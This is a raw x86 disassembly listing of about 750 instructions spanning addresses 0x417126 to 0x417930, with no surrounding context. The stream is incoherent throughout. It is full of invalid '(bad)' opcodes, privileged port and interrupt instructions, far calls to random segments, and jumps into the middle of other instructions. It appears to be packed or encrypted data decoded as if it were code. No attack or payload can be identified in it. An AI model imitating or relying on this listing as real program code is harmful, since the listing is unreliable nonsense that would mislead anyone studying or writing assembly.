  417126:	xchg   edi,eax
  417127:	push   eax
  417128:	xchg   ebx,eax
  417129:	jne    0x41717e
  41712b:	dec    ebx
  41712c:	cmp    DWORD PTR [eax],0x260340b4
  417132:	sbb    eax,0x67909402
  417137:	jmp    0x967e3725
  41713c:	(bad)  
  41713d:	ins    BYTE PTR es:[edi],dx
  41713e:	out    0x4c,eax
  417140:	cmp    cl,BYTE PTR [edx+edi*4+0x4e8cea1f]
  417147:	arpl   WORD PTR [edx+0x2e6f4b0],sp
  41714d:	imul   eax,DWORD PTR [ecx+0x1ae12224],0x16ad3c5
  417157:	cli    
  417158:	cmp    BYTE PTR [ebx],dh
  41715a:	imul   edx,DWORD PTR [esi],0x550ba832
  417160:	inc    esi
  417161:	popf   
  417162:	add    eax,0xd914bf9a
  417167:	or     eax,DWORD PTR [esi]
  417169:	cmp    DWORD PTR [ebx-0x580d74ee],ebx
  41716f:	and    BYTE PTR [edx+0x7de8d175],bl
  417175:	addr16 push 0x5bf4fb6f
  41717b:	fmul   st,st(3)
  41717d:	xchg   ebp,eax
  41717e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41717f:	cmp    eax,0xc76d768e
  417184:	inc    ecx
  417185:	xlat   BYTE PTR ds:[ebx]
  417186:	jmp    FWORD PTR [ebx]
  417188:	pop    esi
  417189:	aam    0x5f
  41718b:	sbb    ebp,edi
  41718d:	js     0x4171e2
  41718f:	and    DWORD PTR [ecx],0xff11b0a2
  417195:	adc    esp,DWORD PTR [edx+0x7f9f7982]
  41719b:	push   ss
  41719c:	mov    bl,0xc9
  41719e:	push   edx
  41719f:	repnz pop eax
  4171a1:	dec    eax
  4171a2:	popf   
  4171a3:	inc    edi
  4171a4:	xor    eax,DWORD PTR ds:0x40184bb4
  4171aa:	rol    edx,1
  4171ac:	retf   0x3e1a
  4171af:	daa    
  4171b0:	leave  
  4171b1:	arpl   WORD PTR ds:0x4fea2da2,dx
  4171b7:	sub    DWORD PTR [edi-0x33],0xd319670d
  4171be:	call   0x70ef844c
  4171c3:	mov    ah,ah
  4171c5:	pop    esi
  4171c6:	ret    0xeb1
  4171c9:	loopne 0x4171dc
  4171cb:	jp     0x4171a8
  4171cd:	jl     0x417239
  4171cf:	retf   
  4171d0:	mov    esi,0x4325c052
  4171d5:	dec    edx
  4171d6:	jne    0x4171b2
  4171d8:	or     eax,0x20af87e7
  4171dd:	(bad)  
  4171de:	out    dx,eax
  4171df:	das    
  4171e0:	push   ebp
  4171e1:	xchg   esi,eax
  4171e2:	cmp    DWORD PTR fs:[ebx],0xffffff8d
  4171e6:	add    ecx,edi
  4171e8:	mov    dl,bl
  4171ea:	int    0x4b
  4171ec:	mov    bl,dh
  4171ee:	je     0x4171e9
  4171f0:	jmp    DWORD PTR [eax-0x34]
  4171f3:	addr16 in eax,dx
  4171f5:	adc    edi,DWORD PTR [ebp-0x1d41740e]
  4171fb:	popf   
  4171fc:	mov    ch,0xb8
  4171fe:	jg     0x417196
  417200:	nop
  417201:	je     0x4171de
  417203:	and    BYTE PTR [ebp+0x65980f80],dl
  417209:	imul   ecx,DWORD PTR [ebp+0x4b],0xfffffff4
  41720d:	sti    
  41720e:	jl     0x417209
  417210:	and    al,0x76
  417212:	jmp    0x417287
  417214:	dec    DWORD PTR [eax-0x2f]
  417217:	add    ecx,DWORD PTR [ecx]
  417219:	mov    ebp,0x709f64e
  41721e:	in     al,dx
  41721f:	jbe    0x41729b
  417221:	mov    ebp,0xdd78544
  417226:	or     eax,0xcccd3fd0
  41722b:	inc    esp
  41722c:	imul   ebp,DWORD PTR [edx+0x1f],0xffffffb8
  417230:	or     eax,0xe855de76
  417235:	jp     0x41720f
  417237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417238:	jg     0x4171e1
  41723a:	lds    edx,FWORD PTR [edx]
  41723c:	add    BYTE PTR [edi],ah
  41723e:	in     eax,0xd
  417240:	dec    eax
  417241:	xchg   BYTE PTR [ebx],al
  417243:	pop    edx
  417244:	dec    eax
  417245:	push   ds
  417246:	push   0x726f381a
  41724b:	(bad)  [ebx]
  41724d:	jp     0x417285
  41724f:	inc    ebp
  417250:	dec    ebp
  417251:	dec    edx
  417252:	popa   
  417253:	jge    0x417290
  417255:	mov    dl,0x48
  417257:	push   ebp
  417258:	outs   dx,DWORD PTR ds:[esi]
  417259:	cld    
  41725a:	pusha  
  41725b:	aad    0xcf
  41725d:	adc    eax,0x16caa24a
  417262:	and    bl,BYTE PTR [eax]
  417264:	cld    
  417265:	mov    ds:0x9be9ff68,eax
  41726a:	call   0xc207cc3e
  41726f:	mov    ds:0xc5051d1b,eax
  417274:	mov    ch,0xea
  417276:	xchg   edi,esi
  417278:	fld    DWORD PTR [edx-0x7d]
  41727b:	iret   
  41727c:	inc    ebp
  41727d:	stos   DWORD PTR es:[edi],eax
  41727e:	lds    eax,FWORD PTR es:[ecx]
  417281:	or     esi,edx
  417283:	clc    
  417284:	dec    ebp
  417285:	stc    
  417286:	xchg   edx,eax
  417287:	ret    
  417288:	repnz loopne 0x4172b4
  41728b:	div    DWORD PTR [ebx+0x35002f8e]
  417291:	jbe    0x417267
  417293:	fwait
  417294:	push   es
  417295:	jnp    0x4172e4
  417297:	add    DWORD PTR [edi+0x5a],ebp
  41729a:	push   0xffffffc6
  41729c:	pushf  
  41729d:	push   ss
  41729e:	les    ebp,FWORD PTR [esi-0x5702a6e6]
  4172a4:	inc    ecx
  4172a5:	fsubr  st(0),st
  4172a7:	into   
  4172a8:	sub    al,0x1b
  4172aa:	dec    ecx
  4172ab:	mov    ah,0x36
  4172ad:	sub    al,0xf
  4172af:	int3   
  4172b0:	xor    eax,0xd1c5c59a
  4172b5:	xchg   ecx,eax
  4172b6:	pop    DWORD PTR [ecx]
  4172b8:	xchg   ebx,eax
  4172b9:	cmc    
  4172ba:	in     eax,0xf1
  4172bc:	jmp    0x8823:0xab4b6f25
  4172c3:	pop    esp
  4172c4:	ret    
  4172c5:	or     al,0x5f
  4172c7:	or     eax,0x8e14ef5a
  4172cc:	(bad)  
  4172ce:	test   al,0x5b
  4172d0:	aas    
  4172d1:	or     eax,0x7ec2006
  4172d6:	stos   BYTE PTR es:[edi],al
  4172d7:	sub    bl,BYTE PTR [ebx+0x1155c7c6]
  4172dd:	mov    ebx,0x9e783326
  4172e2:	push   esi
  4172e3:	adc    DWORD PTR [edi],0xbc8da38c
  4172e9:	inc    ecx
  4172ea:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4172ec:	dec    ebx
  4172ed:	outs   dx,BYTE PTR ds:[esi]
  4172ee:	mov    ecx,0x81dfafae
  4172f3:	mov    edx,0xe26510c0
  4172f8:	and    ebp,DWORD PTR ds:0x86d7811d
  4172fe:	cdq    
  4172ff:	pop    ebx
  417300:	push   edi
  417301:	pop    ds
  417302:	mov    edi,fs
  417304:	add    al,0xaf
  417306:	daa    
  417307:	mov    al,ds:0x3b58e004
  41730c:	adc    eax,0x5098d65a
  417311:	mov    WORD PTR [edx-0x36bfa1a6],?
  417317:	outs   dx,DWORD PTR ds:[esi]
  417318:	push   es
  417319:	mov    ecx,0x5740839b
  41731e:	iret   
  41731f:	pop    ds
  417320:	sub    eax,0x6aa73b62
  417325:	out    0x9a,al
  417327:	(bad)  
  417328:	push   cs
  417329:	pop    es
  41732a:	add    BYTE PTR [ecx+ecx*1],dh
  41732d:	push   cs
  41732e:	lock pop es
  417330:	pop    ds
  417331:	lds    edx,FWORD PTR [ebx+0x6]
  417334:	xor    al,0x1f
  417336:	scas   al,BYTE PTR es:[edi]
  417337:	fbld   TBYTE PTR [eax-0x23d2ff93]
  41733d:	pop    ecx
  41733e:	push   eax
  41733f:	sub    al,0x86
  417341:	popf   
  417342:	sub    DWORD PTR [edi+ebp*8-0x40f99eb5],esp
  417349:	loopne 0x4173c9
  41734b:	sub    ecx,DWORD PTR [ebx-0x40bdf451]
  417351:	out    dx,eax
  417352:	xlat   BYTE PTR ds:[ebx]
  417353:	std    
  417354:	gs inc BYTE PTR es:[edi]
  417358:	jl     0x417319
  41735a:	fs xchg ebx,eax
  41735c:	cwde   
  41735d:	adc    ecx,edi
  41735f:	and    eax,0x77182ca0
  417364:	lahf   
  417365:	cmp    DWORD PTR [eax],eax
  417367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417368:	sub    ebp,DWORD PTR [edx]
  41736a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41736b:	ja     0x41735f
  41736d:	test   BYTE PTR ds:0x233d6a2,bl
  417373:	mov    cl,0x73
  417375:	out    dx,al
  417376:	(bad)  
  417377:	jbe    0x943631d4
  41737d:	call   0x1e98:0x9e8a853a
  417384:	adc    ebx,DWORD PTR [eax+esi*2+0x66e0aa83]
  41738b:	cmc    
  41738c:	add    BYTE PTR [esi-0x5f477e67],dl
  417392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417393:	sub    edx,ecx
  417395:	pop    es
  417396:	out    dx,al
  417397:	mov    al,0x6f
  417399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41739a:	imul   ebx,DWORD PTR [edx+0x58],0x51
  41739e:	and    ebp,DWORD PTR ds:0xe67c1d5
  4173a4:	mov    eax,0xf327c594
  4173a9:	adc    DWORD PTR [esi-0x78dc28d4],edi
  4173af:	mov    bl,al
  4173b1:	or     ebp,edi
  4173b3:	aaa    
  4173b4:	sbb    dl,bl
  4173b6:	adc    eax,ebp
  4173b8:	jge    0x41739f
  4173ba:	jl     0x417412
  4173bc:	sub    DWORD PTR [ecx+ecx*2],ebp
  4173bf:	fsub   QWORD PTR [edi]
  4173c1:	dec    edx
  4173c2:	xchg   edi,eax
  4173c3:	and    eax,0xc237ea7e
  4173c8:	adc    DWORD PTR [edx],0x2c02448c
  4173ce:	scas   al,BYTE PTR es:[edi]
  4173cf:	outs   dx,BYTE PTR ds:[esi]
  4173d0:	jmp    0xb522:0xe9cdd1b6
  4173d7:	aaa    
  4173d8:	pop    edi
  4173d9:	in     al,dx
  4173da:	sar    edi,cl
  4173dc:	int3   
  4173dd:	les    edx,FWORD PTR [esi+0x272c5dcb]
  4173e3:	pop    ds
  4173e4:	fld    DWORD PTR [edi]
  4173e6:	mov    edx,0x68abb42e
  4173eb:	xor    bl,BYTE PTR [ebx+esi*1]
  4173ee:	mov    dl,0x6b
  4173f0:	(bad)  
  4173f1:	fnstenv [edx-0x2b]
  4173f4:	pop    ebx
  4173f5:	push   edi
  4173f6:	jnp    0x417390
  4173f8:	cmp    dh,BYTE PTR [edi+0x7c73fa4c]
  4173fe:	push   esi
  4173ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417400:	cmp    al,dl
  417402:	sub    eax,DWORD PTR [edx+0x71eb1fe2]
  417408:	daa    
  417409:	sbb    DWORD PTR [edx+0x26],ebx
  41740c:	stc    
  41740d:	sbb    ebp,ebx
  41740f:	ins    BYTE PTR es:[edi],dx
  417410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417411:	fsqrt  
  417413:	push   edi
  417414:	clc    
  417415:	dec    ecx
  417416:	dec    edi
  417417:	dec    ebp
  417418:	stos   BYTE PTR es:[edi],al
  417419:	ds xor eax,0xdff7d57b
  41741f:	mov    cl,0x2
  417421:	push   cs
  417422:	xchg   edx,eax
  417423:	mov    eax,ds:0x78ddda37
  417428:	sbb    al,0xfa
  41742a:	int3   
  41742b:	mov    eax,eax
  41742d:	sub    DWORD PTR [ebp+0x3c],edx
  417430:	std    
  417431:	js     0x4173c6
  417433:	test   eax,0x742902ff
  417438:	ret    
  417439:	sbb    edx,eax
  41743b:	sahf   
  41743c:	sbb    esp,DWORD PTR [edi-0x615a0f58]
  417442:	shl    DWORD PTR [ebx],cl
  417444:	gs (bad) 
  417446:	arpl   WORD PTR ds:0x18c8eeff,cx
  41744c:	sbb    DWORD PTR [ebx],esi
  41744e:	fs inc eax
  417450:	dec    ebx
  417451:	pop    es
  417452:	dec    ebp
  417453:	test   bh,0x44
  417456:	ins    DWORD PTR es:[edi],dx
  417457:	out    0x6d,eax
  417459:	and    ebx,ebx
  41745b:	or     eax,0x2735b0b1
  417460:	ja     0x41749b
  417462:	adc    DWORD PTR [ecx+0x62624eeb],ecx
  417468:	xor    eax,0x524fa06b
  41746d:	push   edi
  41746e:	mov    ds:0x129ff211,eax
  417473:	in     al,0x81
  417475:	jne    0x4174d2
  417477:	or     al,0x98
  417479:	fwait
  41747a:	gs mov ch,0x12
  41747d:	pop    edi
  41747e:	xor    al,0xd0
  417480:	and    ah,BYTE PTR ds:0xf13b1e0c
  417486:	fnsave [ebx]
  417488:	ror    BYTE PTR [edi],cl
  41748a:	push   ecx
  41748b:	mov    eax,ebx
  41748d:	or     al,0x80
  41748f:	mov    DWORD PTR [eax+0x1fa4904a],esp
  417495:	jp     0x41749d
  417497:	dec    ecx
  417498:	pop    ebp
  417499:	stc    
  41749a:	cmp    eax,0x3df94680
  41749f:	imul   ecx,DWORD PTR [edx],0x561b93ee
  4174a5:	loop   0x4174c6
  4174a7:	sub    DWORD PTR [esi],edi
  4174a9:	iret   
  4174aa:	test   DWORD PTR [eax-0x16c56c64],0xfd75aa44
  4174b4:	jp     0x41744e
  4174b6:	xor    dl,BYTE PTR [edx-0x28]
  4174b9:	push   cs
  4174ba:	js     0x41753a
  4174bc:	jbe    0x417446
  4174be:	mov    ds:0xcfcb4929,al
  4174c4:	mov    esi,DWORD PTR [eax]
  4174c6:	repz (bad) 
  4174c8:	test   BYTE PTR [edx],dl
  4174ca:	aas    
  4174cb:	add    BYTE PTR [ebp-0x66],dh
  4174ce:	imul   esp,edx,0x3b
  4174d1:	ret    
  4174d2:	push   0xffffffde
  4174d4:	sbb    esp,DWORD PTR [ecx+0x46]
  4174d7:	fiadd  WORD PTR [edi]
  4174d9:	and    DWORD PTR [ebx-0x2c],eax
  4174dc:	mov    eax,ds:0xc31c4c1c
  4174e1:	jp     0x4174c9
  4174e3:	enter  0x91ad,0xae
  4174e7:	xchg   ebp,eax
  4174e8:	stos   DWORD PTR es:[edi],eax
  4174e9:	adc    DWORD PTR [ecx-0x13d1a6bd],ecx
  4174ef:	lahf   
  4174f0:	(bad)  
  4174f1:	data16 jge 0x417479
  4174f4:	jnp    0x4174dc
  4174f6:	dec    DWORD PTR [ebp+0x59f58654]
  4174fc:	mov    ah,BYTE PTR [eax]
  4174fe:	push   ebp
  4174ff:	jno    0x417531
  417501:	jp     0x4174c4
  417503:	xor    ch,BYTE PTR [ecx]
  417505:	fld    DWORD PTR [ebp-0x4a]
  417508:	cmp    al,0x23
  41750a:	dec    esp
  41750b:	and    dh,BYTE PTR [edi+0x2c]
  41750e:	fsubrp st(3),st
  417510:	popf   
  417511:	scas   al,BYTE PTR es:[edi]
  417512:	rol    DWORD PTR [edi-0x704540dd],1
  417518:	les    esp,FWORD PTR [ebp+0x739ea673]
  41751e:	jo     0x417509
  417520:	mov    ebp,cr6
  417523:	pop    es
  417524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417525:	stos   BYTE PTR es:[edi],al
  417526:	xchg   DWORD PTR [ecx],esp
  417528:	test   eax,0xc6502013
  41752d:	jmp    0x41754d
  41752f:	adc    edi,edi
  417531:	dec    ecx
  417532:	push   0x57
  417534:	jp     0x4174c4
  417536:	xor    al,0xa7
  417538:	push   edx
  417539:	jg     0x417508
  41753b:	xor    ebp,DWORD PTR [eax+edx*1+0x3c]
  41753f:	xor    DWORD PTR [eax],0x4a1eb0a6
  417545:	pop    ebp
  417546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417547:	pop    ss
  417548:	pop    eax
  417549:	push   esi
  41754a:	adc    DWORD PTR [ebx-0x1b18c6ab],0x7ab2256b
  417554:	sahf   
  417555:	xor    al,0xa3
  417557:	aaa    
  417558:	(bad)  
  417559:	cld    
  41755a:	xadd   DWORD PTR [ecx],ecx
  41755d:	arpl   WORD PTR [ebp+0x7b],di
  417560:	mov    ?,WORD PTR [esi+ecx*1+0x75]
  417564:	jns    0x41751b
  417566:	je     0x4175c9
  417568:	ror    DWORD PTR [ebx],0x29
  41756b:	ins    DWORD PTR es:[edi],dx
  41756c:	scas   eax,DWORD PTR es:[edi]
  41756d:	xor    eax,0x533c8a97
  417572:	ret    0x526b
  417575:	xchg   al,ch
  417577:	cmp    DWORD PTR [ebp+0x3b2d10ca],ebp
  41757d:	mov    ebx,0xb02450f6
  417582:	(bad)  
  417583:	std    
  417584:	or     BYTE PTR [esi-0x6e],0x96
  417588:	xchg   esi,eax
  417589:	js     0x4175fd
  41758b:	imul   ecx,DWORD PTR [eax],0x79
  41758e:	jmp    0x4175a1
  417590:	jnp    0x4175ff
  417592:	popa   
  417593:	fdivr  st(7),st
  417595:	outs   dx,DWORD PTR ds:[esi]
  417596:	fstp   st(5)
  417598:	leave  
  417599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41759a:	ror    BYTE PTR [edi-0x1ed712f2],0xb2
  4175a1:	cmp    BYTE PTR [eax+0x18],bh
  4175a4:	shl    BYTE PTR [edi],0xfc
  4175a7:	push   ebp
  4175a8:	pop    esi
  4175a9:	push   edi
  4175aa:	push   ebp
  4175ab:	into   
  4175ac:	xchg   BYTE PTR [eax-0x7d],bh
  4175af:	inc    ebx
  4175b0:	lds    esp,FWORD PTR [esp+eiz*4-0x57]
  4175b4:	mov    ds:0xcc84dcb7,al
  4175b9:	mov    ebx,0x4052956d
  4175be:	call   0x6784:0xef8ebaf9
  4175c5:	jp     0x417557
  4175c7:	add    edx,0xffffffce
  4175ca:	mov    dl,0x46
  4175cc:	mov    edx,0x7089f3a3
  4175d1:	call   0xf76f:0xc7986027
  4175d8:	fdivrp st(2),st
  4175da:	inc    esi
  4175db:	dec    eax
  4175dc:	mov    ss,WORD PTR [edi]
  4175de:	js     0x4175ef
  4175e0:	test   al,0x99
  4175e2:	sbb    eax,0xc0af7fb7
  4175e7:	loopne 0x417625
  4175e9:	ret    
  4175ea:	xchg   ebx,eax
  4175eb:	push   ss
  4175ec:	sbb    cl,BYTE PTR [ebx]
  4175ee:	fcom   DWORD PTR [edx+edi*2]
  4175f1:	mov    ch,0xf
  4175f3:	mov    dl,0xf2
  4175f5:	cs adc eax,0xc34e5af9
  4175fb:	mov    dh,0xec
  4175fd:	sbb    eax,0xda3b962c
  417602:	or     cl,BYTE PTR [edi]
  417604:	xor    BYTE PTR [eax-0x156a9e81],0x81
  41760b:	mov    BYTE PTR [ebp+0x27],cl
  41760e:	lahf   
  41760f:	xchg   esi,eax
  417610:	push   ecx
  417611:	or     eax,0xfa6c3a00
  417616:	cli    
  417617:	or     al,0x5a
  417619:	jecxz  0x4175fc
  41761b:	imul   ecx,DWORD PTR [ecx-0x18c78a15],0x44
  417622:	xchg   ebp,eax
  417623:	aaa    
  417624:	and    al,0x24
  417626:	addr16 ja 0x417612
  417629:	rcr    DWORD PTR [ecx-0x48],0x5a
  41762d:	leave  
  41762e:	or     eax,0xe774507d
  417633:	xchg   ebx,eax
  417634:	stos   DWORD PTR es:[edi],eax
  417635:	mov    ds:0x6976e2d7,al
  41763a:	push   esi
  41763b:	repz ss xchg ebp,eax
  41763e:	neg    DWORD PTR ds:0x4e9b
  417643:	sbb    dl,dl
  417645:	stos   DWORD PTR es:[edi],eax
  417646:	push   eax
  417647:	fiadd  WORD PTR [eax+eax*1-0x25]
  41764b:	and    eax,0x9fb0844c
  417650:	aaa    
  417651:	out    dx,eax
  417652:	enter  0x57a0,0x97
  417656:	push   edi
  417657:	std    
  417658:	aas    
  417659:	sbb    ah,BYTE PTR [edx*8+0x5a0f9dc]
  417660:	mov    eax,0x854b3c9
  417665:	cmp    eax,0x24a81023
  41766a:	mov    ah,0x70
  41766c:	test   eax,0xe84051a6
  417671:	sub    DWORD PTR [ebp+ecx*1+0x4ce915f4],0x4b7ffbe0
  41767c:	mov    esi,0xed425a31
  417681:	mov    ds:0xc837c3eb,al
  417686:	cdq    
  417687:	fwait
  417688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417689:	mov    bh,dl
  41768b:	cdq    
  41768c:	cmp    eax,0xdd8e8d0a
  417691:	call   0x278172d9
  417696:	or     al,0xad
  417698:	test   DWORD PTR [edi+0x3f],ebx
  41769b:	lahf   
  41769c:	add    BYTE PTR [edx-0x75c035a8],ch
  4176a2:	inc    esi
  4176a3:	call   0xed1a:0x125b8915
  4176aa:	ja     0x417695
  4176ac:	mov    dl,0xc2
  4176ae:	jp     0x417699
  4176b0:	xchg   ebx,eax
  4176b1:	clc    
  4176b2:	cmp    eax,0x38b6ae61
  4176b7:	jecxz  0x41770d
  4176b9:	jne    0x4176b4
  4176bb:	ficomp WORD PTR [edx+0x46]
  4176be:	add    eax,0xc246ad0f
  4176c3:	retf   
  4176c4:	stos   DWORD PTR es:[edi],eax
  4176c5:	xchg   esp,eax
  4176c6:	mov    al,0xf2
  4176c8:	out    dx,eax
  4176c9:	and    ebx,DWORD PTR [edi+edx*8+0x45]
  4176cd:	aas    
  4176ce:	dec    eax
  4176cf:	cs jmp 0xc5b0:0x89881844
  4176d7:	out    dx,eax
  4176d8:	adc    DWORD PTR [ebp+ebx*1-0x5d681fad],esi
  4176df:	xor    dl,dl
  4176e1:	jp     0x4176a8
  4176e3:	ins    DWORD PTR es:[edi],dx
  4176e4:	jae    0x417746
  4176e6:	jo     0x4176fa
  4176e8:	ffree  st(2)
  4176ea:	pop    edi
  4176eb:	int    0xe9
  4176ed:	ret    0xbb8b
  4176f0:	push   ebx
  4176f1:	and    cl,al
  4176f3:	xchg   BYTE PTR [ecx],al
  4176f5:	add    BYTE PTR ds:0xff5809c5,ah
  4176fb:	jb     0x41768d
  4176fd:	lds    edi,FWORD PTR [edi-0x6]
  417700:	jmp    DWORD PTR [esi-0x18]
  417703:	or     DWORD PTR ds:[edi],0x75
  417707:	sbb    ch,bh
  417709:	inc    esp
  41770a:	shl    DWORD PTR [eax+ebp*1-0x32fdeb6f],cl
  417711:	and    ah,BYTE PTR [esi-0x41163880]
  417717:	inc    BYTE PTR [edx+0x57]
  41771a:	loope  0x41777f
  41771c:	inc    edx
  41771d:	adc    eax,0x586118ad
  417722:	test   esp,ebp
  417724:	pusha  
  417725:	jo     0x41776d
  417727:	cmp    dh,BYTE PTR [ebx+ebp*1+0x3f]
  41772b:	clc    
  41772c:	fs push ebx
  41772e:	scas   eax,DWORD PTR es:[edi]
  41772f:	retf   
  417730:	mov    al,BYTE PTR [ebp+0x5b186cb5]
  417736:	xlat   BYTE PTR ds:[ebx]
  417737:	addr16 pop ecx
  417739:	xchg   ebp,eax
  41773a:	enter  0xf9d6,0x83
  41773e:	(bad)  
  41773f:	inc    ebp
  417740:	repz or BYTE PTR ds:0x2740185a,0x9d
  417748:	mov    edx,0xed2aaaa8
  41774d:	mov    cl,0x85
  41774f:	fisub  DWORD PTR [edi]
  417751:	addr16 sub esi,ebx
  417754:	xchg   BYTE PTR ds:0x913151fe,dh
  41775a:	jmp    0x4176e6
  41775c:	add    al,0xb5
  41775e:	shl    DWORD PTR [eax+0x3b],0xed
  417762:	add    BYTE PTR gs:[edi-0x39869839],ah
  417769:	popf   
  41776a:	call   0xd633:0x887f6fec
  417771:	pop    ds
  417772:	mov    esp,0x54eed04a
  417777:	test   al,0x0
  417779:	je     0x417714
  41777b:	dec    esi
  41777c:	aas    
  41777d:	loopne 0x417754
  41777f:	addr16 jns 0x41777f
  417782:	xchg   esi,eax
  417783:	iret   
  417784:	jne    0x41771a
  417786:	lock cli 
  417788:	cmp    BYTE PTR [edi+edi*1],ch
  41778b:	stos   BYTE PTR es:[edi],al
  41778c:	imul   ecx,esi,0x19
  41778f:	ficomp WORD PTR [eax]
  417791:	inc    DWORD PTR [ecx]
  417793:	dec    esp
  417794:	pusha  
  417795:	adc    eax,0x562c8ab7
  41779a:	es pop ecx
  41779c:	lods   eax,DWORD PTR ds:[esi]
  41779d:	loop   0x417726
  41779f:	cmp    DWORD PTR [eax+0x42],ecx
  4177a2:	or     dh,cl
  4177a4:	mov    dh,0xf8
  4177a6:	adc    eax,0x437efe77
  4177ab:	ins    DWORD PTR es:[edi],dx
  4177ac:	stc    
  4177ad:	popf   
  4177ae:	popa   
  4177af:	fbstp  TBYTE PTR [edx-0x1c029a8f]
  4177b5:	sbb    DWORD PTR [esi-0x6b3d2bfc],ebp
  4177bb:	jbe    0x4177a0
  4177bd:	add    eax,0xb0a0cb6e
  4177c2:	stos   BYTE PTR es:[edi],al
  4177c3:	push   0x3cfe3208
  4177c8:	shl    BYTE PTR [ebx-0x75dcf50d],0xe1
  4177cf:	mov    al,0x1
  4177d1:	std    
  4177d2:	lock mov eax,ds:0x503ef390
  4177d8:	and    al,0xd5
  4177da:	jb     0x4177ba
  4177dc:	inc    eax
  4177dd:	sub    BYTE PTR [eax+0x5fff62e3],dh
  4177e3:	lods   eax,DWORD PTR ds:[esi]
  4177e4:	push   0x3ab033c
  4177e9:	pop    eax
  4177ea:	or     ebx,ebx
  4177ec:	fxch   st(5)
  4177ee:	add    al,0x75
  4177f0:	repz inc ebp
  4177f2:	mov    DWORD PTR [edx+0x5e],0xec8a4782
  4177f9:	or     eax,0xc3f34032
  4177fe:	stos   BYTE PTR es:[edi],al
  4177ff:	sbb    esi,esi
  417801:	cmp    dl,BYTE PTR [edi]
  417803:	mov    esi,0xebf45857
  417808:	sti    
  417809:	add    al,0x27
  41780b:	ds mov ah,0x2e
  41780e:	out    0xf2,eax
  417810:	pop    edx
  417811:	xchg   ecx,eax
  417812:	add    ah,BYTE PTR [ecx+ebp*8-0x2fa327b8]
  417819:	sub    ebx,DWORD PTR [edx]
  41781b:	and    al,0xeb
  41781d:	add    al,0xf5
  41781f:	rcr    BYTE PTR [edi],0x96
  417822:	and    al,0x85
  417824:	jmp    0x417848
  417826:	mov    al,ds:0x14ebf235
  41782b:	stc    
  41782c:	scas   al,BYTE PTR es:[edi]
  41782d:	mov    dl,0x6
  41782f:	xchg   ch,bh
  417831:	xor    eax,0x2c4878b4
  417836:	test   BYTE PTR [ebp-0x6884fa34],dl
  41783c:	xchg   ebp,eax
  41783d:	sub    BYTE PTR [edx+0x5ce16d6e],al
  417843:	pop    ds
  417844:	in     al,dx
  417845:	dec    si
  417847:	sbb    BYTE PTR [ebp-0x1e],dl
  41784a:	mov    ds:0x6e57bd7c,al
  41784f:	in     eax,0x7b
  417851:	aaa    
  417852:	jne    0x4177eb
  417854:	(bad)  
  417855:	ja     0x417836
  417857:	sbb    al,BYTE PTR [edi-0x22e30c2e]
  41785d:	fdivr  st(7),st
  41785f:	or     ecx,esi
  417861:	js     0x417819
  417863:	sbb    bl,BYTE PTR [edx-0x64]
  417866:	pop    ecx
  417867:	add    BYTE PTR [ebx],al
  417869:	or     DWORD PTR [esi+0x3a],ebp
  41786c:	jb     0x4178c5
  41786e:	dec    edx
  41786f:	add    eax,0x3fb37584
  417874:	shl    BYTE PTR [edi],1
  417876:	add    al,0x67
  417878:	out    0x27,al
  41787a:	cli    
  41787b:	test   BYTE PTR [edi-0x26ea4be1],0xc6
  417882:	and    DWORD PTR [ebx+esi*8],esp
  417885:	sbb    bl,bl
  417887:	mov    fs,WORD PTR [eax-0x55689e55]
  41788d:	dec    esi
  41788e:	sbb    BYTE PTR [esp+esi*2-0x5b],bl
  417892:	mov    dl,0xd9
  417894:	mov    ch,0x93
  417896:	out    0x1c,eax
  417898:	idiv   BYTE PTR [esi-0x9aa4a5d]
  41789e:	retf   
  41789f:	adc    eax,0xc93f4405
  4178a4:	rcl    DWORD PTR ds:0x2c190a1,0xba
  4178ab:	cld    
  4178ac:	fdivr  QWORD PTR ss:[edi-0x48]
  4178b0:	inc    edx
  4178b1:	jno    0x4178c8
  4178b3:	sub    BYTE PTR [eax+ebp*2],cl
  4178b6:	ror    BYTE PTR [esi+0x6],0x98
  4178ba:	fdiv   st,st(4)
  4178bc:	jae    0x417887
  4178be:	scas   al,BYTE PTR es:[edi]
  4178bf:	stos   DWORD PTR es:[edi],eax
  4178c0:	imul   cl
  4178c2:	jbe    0x417889
  4178c4:	mov    edx,0x5c5b494c
  4178c9:	or     eax,0xea159aa7
  4178ce:	cmp    ecx,ecx
  4178d0:	xor    al,0xdf
  4178d2:	mov    ah,0x74
  4178d4:	in     al,0x76
  4178d6:	pop    ebx
  4178d7:	push   ds
  4178d8:	push   ebx
  4178d9:	(bad)  
  4178da:	bound  edx,QWORD PTR [eax-0x4e]
  4178dd:	or     al,0x3
  4178df:	scas   eax,DWORD PTR es:[edi]
  4178e0:	add    al,0x27
  4178e2:	push   edi
  4178e3:	mov    dl,BYTE PTR [edi+0x3b8a45e1]
  4178e9:	jns    0x4178bb
  4178eb:	mov    cl,0x94
  4178ed:	nop
  4178ee:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4178f0:	(bad)  
  4178f2:	ret    0xf021
  4178f5:	js     0x417976
  4178f7:	sub    eax,0xd2b6ec29
  4178fc:	(bad)  
  4178fd:	pushf  
  4178fe:	pop    ecx
  4178ff:	push   0x4e10042a
  417904:	jb     0x417961
  417906:	das    
  417907:	mov    edx,0x464b7f77
  41790c:	add    DWORD PTR [ebx+eax*1],esi
  41790f:	mov    eax,0xd084cac5
  417914:	jae    0x4178a5
  417916:	jmp    0x4178c3
  417918:	xchg   ecx,eax
  417919:	add    al,0x67
  41791b:	es clc 
  41791d:	jb     0x4178d6
  41791f:	mov    dl,0x4d
  417921:	mov    ebx,0xf5d2ead6
  417926:	or     esi,eax
  417928:	jae    0x417950
  41792a:	das    
  41792b:	mov    al,ds:0xe3bad2ba
  417930:	mov    DWORD PTR [esp+eax*1+0x48],esi
